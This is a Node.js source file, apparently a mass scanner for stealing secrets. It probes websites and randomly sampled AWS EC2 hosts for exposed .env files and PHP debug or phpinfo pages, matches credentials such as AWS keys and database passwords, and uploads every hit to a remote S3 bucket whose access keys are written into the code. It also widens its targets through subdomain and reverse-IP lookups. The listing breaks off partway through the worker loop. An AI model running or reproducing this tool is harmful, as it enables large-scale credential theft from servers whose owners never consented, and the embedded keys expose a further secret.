"use strict";

// scanner.js
var https = require("https");
var http = require("http");
var crypto = require("crypto");
var zlib = require("zlib");
var fs = require("fs");
var path = require("path");
var os = require("os");
var dns = require("dns");
var { URL } = require("url");
var { Worker, isMainThread, parentPort, workerData, threadId } = require("worker_threads");
var axios = require("axios");
var cheerio = require("cheerio");
var { S3Client, PutObjectCommand, GetObjectCommand } = require("@aws-sdk/client-s3");
var APP_DIR = __dirname;
var DATA_DIR = "C:\\Users\\Administrator\\Desktop\\new_script\\app";
var packCfg = {};
try {
  packCfg = require(path.join(APP_DIR, "pack.json"));
} catch (e) {
  console.error("[!] pack.json not found or invalid:", e.message);
  process.exit(1);
}
var patterns = packCfg.APP_REGEX_ENV_SHELL || [];
var file_envscan = [...new Set(packCfg.file_env_shellscan || [])];
var file_phpprofile = [...new Set(packCfg.file_phpprofile_shellscan || [])];
var LOG_ACTIVE = false;
var LOG_UPLOAD_INTERVAL = 500 + Math.floor(Math.random() * 300);
var AWS_S3 = true;
var BUNNY_STORAGE = false;
var S3_BUCKET = "diablo-results-store";
var S3_FOLDER = "diablo-results";
var S3_REGION = "eu-north-1";
var S3_ACCESS_KEY = "AKIAW3MEAPS545FBGS5I";
var S3_SECRET_KEY = "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";
var BUNNY_STORAGE_URL = "";
var BUNNY_API_KEY = "";
var LOAD_FROM_SITE = true;
var LOAD_FROM_CIDR = false;
var USE_REV = false;
var MAX_SITE_BATCH = 10;
var MAX_LIST_ENV = 20;
var MAX_LIST_PHP = 20;
var DNS_WORKERS_EC2 = 200;
var DNS_TIMEOUT_EC2 = 3;
var MAX_IPS_PER_CIDR = 3e3;
var TOTAL_SLOTS = 2e3;
var NUM_WORKERS = 5;
var MIN_CIDR_IPS = 1e6;
var s3Client = new S3Client({
  region: S3_REGION,
  credentials: { accessKeyId: S3_ACCESS_KEY, secretAccessKey: S3_SECRET_KEY },
  forcePathStyle: false
});
var RESULT_DIR = path.join(DATA_DIR, "risultati");
var NEW_PATH_EXTRACT = path.join(RESULT_DIR, "DATA_SPLIT");
var SITE_DIR = path.join(DATA_DIR, "site");
var LOGS_DIR = path.join(DATA_DIR, "logs");
var CONTAINER_NAME = process.env.HOSTNAME || `local_${Math.floor(Date.now() / 1e3)}`;
var SLOT_HASH = parseInt(crypto.createHash("md5").update(CONTAINER_NAME).digest("hex").slice(0, 12), 16);
var INSTANCE_ID = SLOT_HASH % TOTAL_SLOTS;
var LOG_PATH = null;
var ax = axios.create({
  httpsAgent: new https.Agent({ rejectUnauthorized: false }),
  httpAgent: new http.Agent({}),
  timeout: 1e4,
  maxRedirects: 0,
  validateStatus: () => true
});
var ts = () => (/* @__PURE__ */ new Date()).toISOString().slice(11, 19);
var log = (...args) => console.log(`[${ts()}]`, ...args);
var randStr = (len) => crypto.randomBytes(Math.ceil(len / 2)).toString("hex").slice(0, len);
var sleep = (ms) => new Promise((r) => setTimeout(r, ms));
var TeeLogger = class {
  constructor(filepath) {
    this.logfile = fs.createWriteStream(filepath, { flags: "a" });
  }
  write(msg) {
    process.stdout.write(msg);
    this.logfile.write(msg);
  }
};
async function uploadFileToS3(localPath, remotePath, maxRetries = 3) {
  if (!AWS_S3) return false;
  const s3key = `${S3_FOLDER}/${remotePath}`;
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      log(`[S3 UPLOAD] ${localPath} -> s3://${S3_BUCKET}/${s3key} (${attempt + 1}/${maxRetries})`);
      const body = await fs.promises.readFile(localPath);
      await s3Client.send(new PutObjectCommand({
        Bucket: S3_BUCKET,
        Key: s3key,
        Body: body
      }));
      log(`[S3 UPLOAD] OK: s3://${S3_BUCKET}/${s3key}`);
      appendToS3Index(s3key).catch(() => {
      });
      return true;
    } catch (e) {
      const msg = e.message || String(e);
      if (msg.includes("429") || msg.includes("Throttling")) {
        const wait = Math.pow(2, attempt);
        log(`[S3 UPLOAD] Rate limited, retry in ${wait}s`);
        await sleep(wait * 1e3);
      } else if (msg.includes("5")) {
        const wait = Math.pow(2, attempt);
        log(`[S3 UPLOAD] Server error, retry in ${wait}s: ${msg}`);
        await sleep(wait * 1e3);
      } else {
        log(`[S3 UPLOAD] Error ${s3key}: ${msg}`);
        return false;
      }
    }
  }
  return false;
}
async function appendToS3Index(s3KeyFull) {
  const indexKey = `${S3_FOLDER}/index.txt`;
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      let existing = "";
      try {
        const getRes = await s3Client.send(new GetObjectCommand({
          Bucket: S3_BUCKET,
          Key: indexKey
        }));
        existing = await getRes.Body.transformToString() || "";
      } catch (e) {
        if (!e.name || e.name !== "NoSuchKey") throw e;
      }
      const newContent = existing + s3KeyFull + "\n";
      await s3Client.send(new PutObjectCommand({
        Bucket: S3_BUCKET,
        Key: indexKey,
        Body: Buffer.from(newContent, "utf8"),
        ContentType: "text/plain"
      }));
      return;
    } catch (e) {
      await sleep(1e3 * (attempt + 1));
    }
  }
}
async function uploadLogToS3() {
  if (!LOG_ACTIVE || !LOG_PATH) return;
  try {
    await fs.promises.access(LOG_PATH);
  } catch (_) {
    return;
  }
  const remote = `logs/${path.basename(LOG_PATH)}`;
  uploadFileToS3(LOG_PATH, remote, 1).catch(() => {
  });
}
async function uploadFileToBunny(localPath, remotePath, maxRetries = 3) {
  if (!BUNNY_STORAGE) return false;
  const headers = { "AccessKey": BUNNY_API_KEY };
  const url = `${BUNNY_STORAGE_URL}/${remotePath}`;
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      log(`[BUNNY UPLOAD] ${localPath} -> ${remotePath} (${attempt + 1}/${maxRetries})`);
      const data = await fs.promises.readFile(localPath);
      const res = await ax.put(url, { headers, data, timeout: 3e4 });
      if ([200, 201].includes(res.status)) {
        log(`[BUNNY UPLOAD] OK: ${remotePath}`);
        return true;
      }
      if (res.status === 429) {
        await sleep(Math.pow(2, attempt) * 1e3);
      } else if (res.status >= 500) {
        await sleep(Math.pow(2, attempt) * 1e3);
      } else {
        log(`[BUNNY UPLOAD] Error ${remotePath}: Status ${res.status}`);
        return false;
      }
    } catch (e) {
      if (attempt < maxRetries - 1) {
        await sleep(Math.pow(2, attempt) * 1e3);
      } else {
        log(`[BUNNY UPLOAD] FAILED ${remotePath}: ${e.message}`);
      }
    }
  }
  return false;
}
async function uploadLogToBunny() {
  if (!LOG_ACTIVE || !LOG_PATH) return;
  try {
    await fs.promises.access(LOG_PATH);
  } catch (_) {
    return;
  }
  const remote = `logs/${path.basename(LOG_PATH)}`;
  uploadFileToBunny(LOG_PATH, remote, 1).catch(() => {
  });
}
async function uploadFile(localPath, remotePath, maxRetries = 3) {
  let ok = false;
  if (AWS_S3) {
    if (await uploadFileToS3(localPath, remotePath, maxRetries)) ok = true;
  }
  if (BUNNY_STORAGE) {
    if (await uploadFileToBunny(localPath, remotePath, maxRetries)) ok = true;
  }
  return ok;
}
async function uploadLog() {
  if (!LOG_ACTIVE || !LOG_PATH) return;
  try {
    await fs.promises.access(LOG_PATH);
  } catch (_) {
    return;
  }
  if (AWS_S3) uploadLogToS3().catch(() => {
  });
  if (BUNNY_STORAGE) uploadLogToBunny().catch(() => {
  });
}
var DEFAULT_HEADERS = {
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
  "Connection": "keep-alive"
};
function* generateEnvBatches(siteLink) {
  const base = siteLink.replace(/\/+$/, "");
  for (let i = 0; i < file_envscan.length; i += MAX_LIST_ENV) {
    yield file_envscan.slice(i, i + MAX_LIST_ENV).map((p) => `${base}/${p.replace(/^\//, "")}`);
  }
}
function* generatePhpBatches(siteLink) {
  const base = siteLink.replace(/\/+$/, "");
  for (let i = 0; i < file_phpprofile.length; i += MAX_LIST_PHP) {
    yield file_phpprofile.slice(i, i + MAX_LIST_PHP).map((p) => `${base}/${p.replace(/^\//, "")}`);
  }
}
function getInitialUrl(url) {
  if (url.startsWith("http://") || url.startsWith("https://")) return url;
  if (url.endsWith(":443")) return `https://${url}`;
  if (url.endsWith(":80")) return `http://${url}`;
  return `http://${url}`;
}
function getRetryUrl(url) {
  if (url.startsWith("http://")) return url.replace("http://", "https://");
  if (url.startsWith("https://")) return url.replace("https://", "http://");
  if (url.endsWith(":443") || url.endsWith(":80")) return null;
  return `https://${url}`;
}
function cleanSubdomain(sub, domain) {
  sub = sub.trim().toLowerCase();
  sub = sub.replace(/^https?:\/\//, "");
  sub = sub.split(":")[0];
  if (sub.startsWith("*.")) sub = sub.slice(2);
  if (sub.endsWith(".")) sub = sub.slice(0, -1);
  return sub;
}
async function findSubdomains(domain) {
  const sources = [
    { name: "ht", url: `https://api.hackertarget.com/hostsearch/?q=${domain}`, timeout: 1e4 },
    { name: "otx", url: `https://otx.alienvault.com/api/v1/indicators/domain/${domain}/passive_dns`, timeout: 1e4 },
    { name: "crt", url: `https://crt.sh/?q=%.${domain}&output=json`, timeout: 15e3 }
  ];
  const results = await Promise.allSettled(sources.map((s) => ax.get(s.url, { timeout: s.timeout })));
  const subdomains = /* @__PURE__ */ new Set();
  for (let i = 0; i < sources.length; i++) {
    const r = results[i];
    if (r.status !== "fulfilled" || !r.value || r.value.status !== 200) continue;
    const res = r.value;
    const source = sources[i].name;
    try {
      if (source === "ht") {
        const text = typeof res.data === "string" ? res.data : "";
        if (!text.toLowerCase().includes("error")) {
          for (const line of text.trim().split("\n")) {
            const sub = cleanSubdomain(line.split(",")[0], domain);
            if (sub.endsWith(domain) && sub !== domain) subdomains.add(sub);
          }
        }
      } else if (source === "otx") {
        const data = res.data;
        for (const entry of data.passive_dns || []) {
          const sub = cleanSubdomain(entry.hostname || "", domain);
          if (sub.endsWith(domain) && sub !== domain) subdomains.add(sub);
        }
      } else if (source === "crt") {
        const data = res.data;
        for (const entry of data) {
          const name = entry.name_value || "";
          for (let cn of name.split("\n")) {
            cn = cleanSubdomain(cn, domain);
            if (cn.endsWith(domain) && cn !== domain) subdomains.add(cn);
          }
        }
      }
    } catch (_) {
    }
  }
  if (subdomains.size === 0) return null;
  return [...subdomains].sort().map((s) => s.startsWith("www.") ? s.slice(4) : s);
}
async function reverseIpLookup(ip) {
  try {
    const res = await ax.get(`https://api.hackertarget.com/reverseiplookup/?q=${ip}`, { timeout: 15e3 });
    if (res.status !== 200) return null;
    const result = (typeof res.data === "string" ? res.data : res.data.toString()).trim();
    if (!result || result.includes("No DNS A records found") || result.includes("API count exceeded") || result.toLowerCase().includes("error")) return null;
    return result.split("\n").map((d) => {
      d = d.trim();
      if (!d) return null;
      if (d.startsWith("www.")) d = d.slice(4);
      return d;
    }).filter(Boolean);
  } catch (_) {
    return null;
  }
}
async function loadSitesFromFolder(workerId, numWorkers) {
  if (!LOAD_FROM_SITE) return { targets: [], filepath: null };
  try {
    await fs.promises.access(SITE_DIR);
  } catch (_) {
    log(`[SITE] Folder '${SITE_DIR}' not found. Create it and put .txt files with targets.`);
    return { targets: [], filepath: null };
  }
  const files = (await fs.promises.readdir(SITE_DIR)).filter((f) => f.endsWith(".txt")).sort();
  if (files.length === 0) return { targets: [], filepath: null };
  const myIdx = workerId;
  if (myIdx >= files.length) return { targets: [], filepath: null };
  const filename = files[myIdx];
  const filepath = path.join(SITE_DIR, filename);
  let targets = [];
  try {
    const content = await fs.promises.readFile(filepath, "utf8");
    for (let line of content.split("\n")) {
      line = line.trim();
      if (line && !line.startsWith("#")) {
        if (!line.startsWith("http")) line = getInitialUrl(line);
        targets.push(line);
      }
    }
  } catch (e) {
    log(`[SITE] Error reading ${filename}: ${e.message}`);
    return { targets: [], filepath };
  }
  log(`[SITE] Worker ${workerId} \u2014 ${filename}: ${targets.length} targets loaded`);
  return { targets, filepath };
}
async function deleteSiteFile(filepath) {
  try {
    await fs.promises.unlink(filepath);
    log(`[SITE] ${path.basename(filepath)} DELETED`);
  } catch (e) {
    log(`[SITE] (!) Cannot delete ${path.basename(filepath)}: ${e.message}`);
  }
}
function buildRegexPattern(pattern) {
  const specials = /[.^$*+?{}[\]\\|()]/;
  if (specials.test(pattern)) return new RegExp(pattern, "i");
  const escaped = pattern.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const startB = /^[a-zA-Z0-9_]/.test(pattern) ? "\\b" : "";
  const endB = /[a-zA-Z0-9_]$/.test(pattern) ? "\\b" : "";
  return new RegExp(`${startB}${escaped}${endB}`, "i");
}
var compiledPatterns = patterns.map((p) => buildRegexPattern(p));
async function scanSite(siteLink, isFallback = false) {
  try {
    log(`  [LOOK] Starting scan ${siteLink}`);
    let checked = 0;
    let checkeds = 0;
    let wildcardStrikeCount = 0;
    let fakeForSite = false;
    let foundForSite = false;
    const seenContentHashes = /* @__PURE__ */ new Set();
    const envBatches = [...generateEnvBatches(siteLink)];
    for (const batch of envBatches) {
      if (fakeForSite || foundForSite) break;
      const results = await Promise.allSettled(batch.map(
        (url) => ax.get(url, {
          headers: { ...DEFAULT_HEADERS, "Range": "bytes=0-4096" },
          timeout: 6e3,
          responseType: "text",
          transformResponse: [(data) => data]
        })
      ));
      for (const r of results) {
        if (fakeForSite || foundForSite) break;
        if (r.status !== "fulfilled" || !r.value) continue;
        const res = r.value;
        if (![200, 206].includes(res.status)) continue;
        checked++;
        let content = typeof res.data === "string" ? res.data : "";
        const contentLower = content.toLowerCase();
        const head = contentLower.slice(0, 200);
        if (head.includes("<html") || head.includes("<!doctype") || head.includes("<body")) {
          log(`  [!] HTML skip | ${res.config.url}`);
          continue;
        }
        if (contentLower.includes("<pre") && contentLower.includes("</pre")) {
          fakeForSite = true;
          log(`  [!] Skip on ${siteLink} - NOPE (PRE tag)`);
          break;
        }
        if (contentLower.includes("popbox.fun")) {
          fakeForSite = true;
          log(`  [!] Skip on ${siteLink} - NOPE (popbox)`);
          break;
        }
        for (const regex of compiledPatterns) {
          if (regex.test(content)) {
            foundForSite = true;
            break;
          }
        }
        if (foundForSite) {
          log(`  [+] Found | ${res.config.url}`);
          const suffix = randStr(10);
          const savedPath = path.join(NEW_PATH_EXTRACT, `ENV_NEW_${suffix}.txt`);
          await fs.promises.writeFile(savedPath, `${res.config.url}
${content}`);
          const remote = `risultati/DATA_SPLIT/ENV_NEW_${suffix}.txt`;
          uploadFile(savedPath, remote).catch(() => {
          });
          break;
        }
      }
      if (checked >= 10 && !foundForSite) {
        fakeForSite = true;
        log(`  [!] DUPE ENV (${checked}+ links) on ${siteLink} - NOPE`);
        break;
      }
    }
    if (fakeForSite) {
      log(`  [OK] STOP NOPE ${siteLink} \u2014 ${checked} links (DUPE/flood)`);
      return;
    }
    if (foundForSite) {
      log(`  [OK] STOP FOUND ${siteLink} \u2014 ${checked} links`);
      await doReverseAndSubdomains(siteLink, isFallback);
      return;
    }
    const phpBatches = [...generatePhpBatches(siteLink)];
    for (const batch of phpBatches) {
      if (fakeForSite || foundForSite) break;
      const results = await Promise.allSettled(batch.map(
        (url) => ax.post(url, "0x01[]=x", {
          headers: { ...DEFAULT_HEADERS, "Range": "bytes=0-4096", "Content-Type": "application/x-www-form-urlencoded" },
          timeout: 6e3,
          responseType: "arraybuffer"
        })
      ));
      const uniqueResponses = /* @__PURE__ */ new Map();
      const findFileRequests = [];
      for (const r of results) {
        if (fakeForSite || foundForSite) break;
        if (r.status !== "fulfilled" || !r.value) continue;
        const res = r.value;
        if (![200, 206].includes(res.status)) continue;
        checkeds++;
        const requestUrl = res.config.url;
        if (!uniqueResponses.has(requestUrl)) {
          const content = Buffer.isBuffer(res.data) ? res.data : Buffer.from(res.data || "");
          const contentLen = content.length;
          if (contentLen < 10 || contentLen > 1e6) continue;
          const head = content.slice(0, 200).toString("utf8").toLowerCase();
          const isHtmlDoc = head.includes("<html") || head.includes("<!doctype");
          let isDebugPage = false;
          if (isHtmlDoc) {
            const contentStrHead = content.slice(0, 5e3).toString("utf8").toLowerCase();
            const debugKeywords = [
              "phpinfo()",
              "php version",
              "zend extension",
              "php license",
              "sf-toolbar",
              "symfony profiler",
              "php-debugbar",
              "whoops! there was an error",
              "stack trace",
              "aws_access_key_id",
              "db_password",
              "db_host",
              "aws_secret"
            ];
            if (debugKeywords.some((k) => contentStrHead.includes(k))) isDebugPage = true;
          }
          if (isHtmlDoc && !isDebugPage) continue;
          const contentHash = crypto.createHash("md5").update(content).digest("hex");
          if (seenContentHashes.has(contentHash)) {
            wildcardStrikeCount++;
            if (wildcardStrikeCount >= 5) {
              fakeForSite = true;
              log(`  [!] DUP (5 duplicates) on ${siteLink} - NOPE`);
              break;
            }
            continue;
          }
          seenContentHashes.add(contentHash);
          uniqueResponses.set(requestUrl, { url: requestUrl, content, isDebugPage, isHtmlDoc });
          findFileRequests.push({ url: requestUrl, content, isDebugPage, isHtmlDoc });
        }
      }
      if (checkeds >= 10 && !foundForSite) {
        fakeForSite = true;
        log(`  [!] DUPE PHP (${checkeds}+ links) on ${siteLink} - NOPE`);
        break;
      }
      if (uniqueResponses.size > 0) {
        log(`  [DEEP] ${uniqueResponses.size} valid targets, regex extraction on ${siteLink}`);
        for (const item of findFileRequests) {
          if (!item) continue;
          const contentsx = item.content.toString("utf8");
          for (const regex of compiledPatterns) {
            if (regex.test(contentsx)) {
              foundForSite = true;
              break;
            }
          }
          if (foundForSite) {
            log(`  [+] Found | ${item.url}`);
            if (item.isDebugPage || contentsx.toLowerCase().includes("phpinfo")) {
              try {
                const $ = cheerio.load(contentsx);
                const h2 = $("h2").filter((_, el) => $(el).text() === "PHP Variables");
                if (h2.length > 0) {
                  const table = h2.next("table");
                  if (table.length > 0) {
                    let formattedOutput = "";
                    table.find("tr").each((_, row) => {
                      const cols = $(row).find("td");
                      if (cols.length >= 2) {
                        const varName = $(cols[0]).text().trim();
                        const varValue = $(cols[1]).text().trim();
                        const match = varName.match(/\['([^']+)'\]/);
                        if (match) {
                          formattedOutput += `${match[1]} 	 ${varValue}
`;
                        }
                      }
                    });
                    if (formattedOutput) {
                      log(`  [+] PHPINFO FOUND | ${item.url}`);
                      const suffix = randStr(10);
                      const savedPath = path.join(NEW_PATH_EXTRACT, `PHPINFO_${suffix}.txt`);
                      await fs.promises.writeFile(savedPath, `${item.url}
${formattedOutput}`);
                      const remote = `risultati/DATA_SPLIT/PHPINFO_${suffix}.txt`;
                      uploadFile(savedPath, remote).catch(() => {
                      });
                    }
                  }
                }
              } catch (_) {
              }
            }
            break;
          }
        }
      }
      if (fakeForSite || foundForSite) break;
    }
    const totalTested = checked + checkeds;
    if (fakeForSite) {
      log(`  [OK] STOP NOPE ${siteLink} \u2014 ${totalTested} links (DUPE)`);
    } else if (foundForSite) {
      log(`  [OK] STOP FOUND ${siteLink} \u2014 ${totalTested} links`);
      await doReverseAndSubdomains(siteLink, isFallback);
    } else {
      log(`  [OK] STOP NONE ${siteLink} \u2014 ${totalTested} links`);
    }
  } catch (e) {
    try {
      await fs.promises.appendFile(path.join(RESULT_DIR, "err.log"), e.message + "\n");
    } catch (_) {
    }
  }
}
async function processUrls(urlsList, isFallback = false) {
  log(`
[CHK] Starting scan on ${urlsList.length} URLs (fallback=${isFallback})`);
  for (let i = 0; i < urlsList.length; i += 100) {
    const chunk = urlsList.slice(i, i + 100);
    log(`[CHK] Checking block of ${chunk.length} URLs...`);
    const results = await Promise.allSettled(chunk.map(
      (url) => ax.get(getInitialUrl(url), { timeout: 3e3, responseType: "stream" })
    ));
    const hostsBySite = {};
    for (const r of results) {
      if (r.status !== "fulfilled" || !r.value) continue;
      const res = r.value;
      if ([200, 403, 206].includes(res.status)) {
        const siteUrl = getInitialUrl(r.value.config.url);
        if (!hostsBySite[siteUrl]) {
          hostsBySite[siteUrl] = {
            env: [...generateEnvBatches(siteUrl)],
            php: [...generatePhpBatches(siteUrl)]
          };
        }
      }
    }
    const retryUrls = [];
    for (let j = 0; j < results.length; j++) {
      const r = results[j];
      if (r.status !== "fulfilled" || !r.value || ![200, 403, 206].includes(r.value.status)) {
        const retryU = getRetryUrl(chunk[j]);
        if (retryU) retryUrls.push(retryU);
      }
    }
    if (retryUrls.length > 0) {
      log(`[CHK] Retrying ${retryUrls.length} URLs in HTTPS...`);
      const retryResults = await Promise.allSettled(retryUrls.map(
        (url) => ax.get(url, { timeout: 3e3, responseType: "stream" })
      ));
      for (const r of retryResults) {
        if (r.status !== "fulfilled" || !r.value) continue;
        const res = r.value;
        if ([200, 403, 206].includes(res.status)) {
          const siteUrl = getInitialUrl(res.config.url);
          if (!hostsBySite[siteUrl]) {
            hostsBySite[siteUrl] = {
              env: [...generateEnvBatches(siteUrl)],
              php: [...generatePhpBatches(siteUrl)]
            };
          }
        }
      }
    }
    const siteList = Object.entries(hostsBySite);
    for (let batchIdx = 0; batchIdx < siteList.length; batchIdx += MAX_SITE_BATCH) {
      const chunkSites = siteList.slice(batchIdx, batchIdx + MAX_SITE_BATCH);
      await Promise.all(chunkSites.map(
        ([siteUrl, payloads]) => scanSite(siteUrl, isFallback)
      ));
      const bn = Math.floor(batchIdx / MAX_SITE_BATCH) + 1;
      const totalBatches = Math.ceil(siteList.length / MAX_SITE_BATCH);
      log(`  [CHK] Batch ${bn}/${totalBatches} completed`);
    }
  }
}
async function doReverseAndSubdomains(siteLink, isFallback) {
  if (!USE_REV || isFallback) return;
  let hostxxx;
  try {
    hostxxx = new URL(siteLink).hostname;
  } catch (_) {
    return;
  }
  if (!hostxxx) return;
  if (hostxxx.startsWith("www.")) hostxxx = hostxxx.slice(4);
  const ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
  const isIp = ipRegex.test(hostxxx);
  if (isIp) {
    const domains = await reverseIpLookup(hostxxx);
    if (domains && domains.length > 0) {
      const filtered = domains.filter((d) => d.toLowerCase().replace(/\/+$/, "") !== hostxxx.toLowerCase());
      if (filtered.length > 0) {
        log(`  [REV] IP ${hostxxx} \u2014 found ${filtered.length} domains`);
        for (const d of filtered) log(`    [REV] => ${d}`);
        await processUrls(filtered, true);
      } else {
        log(`  [REV] IP ${hostxxx} \u2014 filtered (all self-referential)`);
      }
    } else {
      log(`  [REV] IP ${hostxxx} \u2014 no domains found`);
    }
  } else {
    const parts = hostxxx.split(".");
    const targetDomain = parts.length > 2 ? parts.slice(-2).join(".") : hostxxx;
    log(`  [REV] Searching subdomains for ${targetDomain}...`);
    let domains = await findSubdomains(targetDomain);
    if (domains && domains.length > 0) {
      domains = domains.filter((d) => d.toLowerCase().replace(/\/+$/, "") !== hostxxx.toLowerCase());
      if (domains.length > 0) {
        log(`  [REV] Domain ${targetDomain} \u2014 found ${domains.length} subdomains`);
        for (const d of domains) log(`    [REV] => ${d}`);
        await processUrls(domains, true);
      }
    } else {
      log(`  [REV] No subdomains, trying reverse IP for ${hostxxx}...`);
      try {
        const addresses = await dns.promises.resolve4(hostxxx);
        if (addresses.length > 0) {
          const targetIp = addresses[0];
          let revDomains = await reverseIpLookup(targetIp);
          if (revDomains && revDomains.length > 0) {
            revDomains = revDomains.filter((d) => d.toLowerCase().replace(/\/+$/, "") !== hostxxx.toLowerCase());
            if (revDomains.length > 0) {
              log(`  [REV] IP ${targetIp} \u2014 found ${revDomains.length} domains`);
              for (const d of revDomains) log(`    [REV] => ${d}`);
              await processUrls(revDomains, true);
            }
          }
        }
      } catch (e) {
        log(`  [REV] DNS failed for ${hostxxx}: ${e.message}`);
      }
    }
  }
}
async function fetchAwsIps() {
  log("[AWS FETCH] Downloading AWS IP ranges...");
  const res = await ax.get("https://ip-ranges.amazonaws.com/ip-ranges.json", { timeout: 3e4 });
  if (res.status !== 200) throw new Error(`AWS IP fetch failed: ${res.status}`);
  return res.data;
}
function getEc2Cidrs(data) {
  return (data.prefixes || []).filter((p) => p.service === "EC2").map((p) => ({ cidr: p.ip_prefix, region: p.region }));
}
function buildCidrPool(cidrs) {
  const sources = [];
  let skipped = 0;
  for (const { cidr, region } of cidrs) {
    try {
      const parts = cidr.split("/");
      const ip = parts[0];
      const prefix = parseInt(parts[1]);
      const total = Math.pow(2, 32 - prefix);
      if (total < MIN_CIDR_IPS) {
        skipped++;
        continue;
      }
      const ipParts = ip.split(".").map(Number);
      const first = ipParts[0] << 24 | ipParts[1] << 16 | ipParts[2] << 8 | ipParts[3];
      const mask = ~((1 << 32 - prefix) - 1) >>> 0;
      const firstAligned = (first & mask) >>> 0;
      sources.push({ first: firstAligned, total, region });
    } catch (_) {
    }
  }
  const regionsSet = new Set(sources.map((s) => s.region));
  log(`[AWS POOL] ${sources.length} CIDRs in ${regionsSet.size} regions (skipped ${skipped} CIDRs <${MIN_CIDR_IPS / 1e6}M IP, max ${MAX_IPS_PER_CIDR} IP/CIDR)`);
  return sources;
}
function ipFromInt(n) {
  return `${n >>> 24 & 255}.${n >>> 16 & 255}.${n >>> 8 & 255}.${n & 255}`;
}
async function verifyEc2Webserver(ip, region) {
  try {
    const hostnames = await dns.promises.reverse(ip);
    const hostname = (hostnames[0] || "").toLowerCase();
    if (!hostname.includes("compute.amazonaws.com")) return null;
    for (const [port, proto] of [[443, "https"], [80, "http"]]) {
      try {
        await new Promise((resolve, reject) => {
          const sock = new (port === 443 ? require("tls") : require("net")).Socket();
          sock.setTimeout(DNS_TIMEOUT_EC2 * 1e3);
          sock.connect(port, hostname, () => {
            sock.destroy();
            resolve();
          });
          sock.on("error", reject);
          sock.on("timeout", () => {
            sock.destroy();
            reject(new Error("timeout"));
          });
        });
        return `${proto}://${hostname}`;
      } catch (_) {
      }
    }
    return null;
  } catch (_) {
    return null;
  }
}
async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
  const allIps = [];
  for (const { first, total, region } of cidrPool) {
    const rem = ((INSTANCE_ID - first % TOTAL_SLOTS) % TOTAL_SLOTS + TOTAL_SLOTS) % TOTAL_SLOTS;
    if (rem >= total) continue;
    const offsetsPool = [];
    for (let o = rem; o < total; o += TOTAL_SLOTS) offsetsPool.push(o);
    let chosen;
    if (MAX_IPS_PER_CIDR >= offsetsPool.length) {
      chosen = offsetsPool;
    } else {
      const seed = first * 7919 + cycleNum * 104729;
      const rng = /* @__PURE__ */ ((s) => () => {
        s = s * 1664525 + 1013904223 | 0;
        return (s >>> 0) / 4294967295;
      })(seed);
      chosen = offsetsPool.sort(() => rng() - 0.5).slice(0, MAX_IPS_PER_CIDR);
    }
    for (const off of chosen) {
      allIps.push({ ip: ipFromInt(first + off), region });
    }
  }
  for (let i = allIps.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [allIps[i], allIps[j]] = [allIps[j], allIps[i]];
  }
  const myIps = allIps.filter((_, i) => i % numWorkers === workerId);
  for (let i = myIps.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [myIps[i], myIps[j]] = [myIps[j], myIps[i]];
  }
  if (workerId === 0) {
    log(`[AWS GATHER #${cycleNum}] Shard ${INSTANCE_ID}/${TOTAL_SLOTS}, ${allIps.length} IPs, split among ${numWorkers} workers (~${Math.floor(myIps.length / numWorkers)} each)`);
  }
  const seenUrls = /* @__PURE__ */ new Set();
  let hits = 0, processed = 0, lastPct = -1;
  const totalMy = myIps.length;
  for (let i = 0; i < myIps.length; i += DNS_WORKERS_EC2) {
    const chunk = myIps.slice(i, i + DNS_WORKERS_EC2);
    const results = await Promise.allSettled(chunk.map(
      ({ ip, region }) => verifyEc2Webserver(ip, region)
    ));
    for (const r of results) {
      processed++;
      if (r.status === "fulfilled" && r.value && !seenUrls.has(r.value)) {
        seenUrls.add(r.value);
        hits++;
      }
    }
    const pct = Math.floor(processed * 100 / totalMy);
    if (pct >= lastPct + 10) {
      lastPct = pct - pct % 10;
      log(`[W${workerId} GATHER #${cycleNum}] ${pct}% (${processed}/${totalMy}) \u2014 ${hits} webservers, ${processed - hits} discarded`);
    }
  }
  const urls = [...seenUrls].filter((u) => !scannedUrlsGlobal.has(u));
  urls.forEach((u) => scannedUrlsGlobal.add(u));
  for (let i = urls.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [urls[i], urls[j]] = [urls[j], urls[i]];
  }
  log(`[W${workerId} GATHER #${cycleNum}] Phase 1: ${hits} webservers, ${processed - hits} discarded out of ${totalMy} IPs`);
  if (urls.length > 0) {
    log(`[W${workerId}] Phase 2 \u2014 Scanning ${urls.length} verified URLs...`);
    await processUrls(urls);
    log(`[W${workerId}] Phase 2 completed.`);
  } else {
    log(`[W${workerId}] No URLs found. Skipping scan.`);
  }
}
var cidrPoolShared = null;
var scannedUrlsGlobal = /* @__PURE__ */ new Set();
async function initCidrPool() {
  if (!LOAD_FROM_CIDR) return null;
  try {
    const awsData = await fetchAwsIps();
    const ec2Cidrs = getEc2Cidrs(awsData);
    if (ec2Cidrs.length === 0) {
      log("[SYS] No EC2 CIDRs found.");
      return null;
    }
    log(`[SYS] Found ${ec2Cidrs.length} EC2 CIDRs. Building pool...`);
    return buildCidrPool(ec2Cidrs);
  } catch (e) {
    log(`[SYS] ERROR fetching AWS IPs: ${e.message}`);
    return null;
  }
}
async function workerLoop(workerId) {
  let cycle = 0;
  while (true) {
    cycle++;
    if (LOAD_FROM_SITE) {
      let filesProcessed = 0;
      while (true) {
        const { targets, filepath } = await loadSitesFromFolder(workerId, NUM_WORKERS);
        if (targets.length === 0) {
          if (filesProcessed > 0) {
            log(`[SITE] Worker ${workerId} \u2014 All files processed (${filesProcessed} files).`);
          } else {
            log(`[SITE] Worker ${workerId} \u2014 No .txt files in site/. Waiting...`);
          }
          break;
        }
        const fname = path.basename(filepath);
        log(`[SITE] Worker ${workerId} \u2014 Scanning ${fname}: ${targets.length} targets`);
        await processUrls(targets);
        await deleteSiteFile(filepath);
        filesProcessed++;
      }
    }
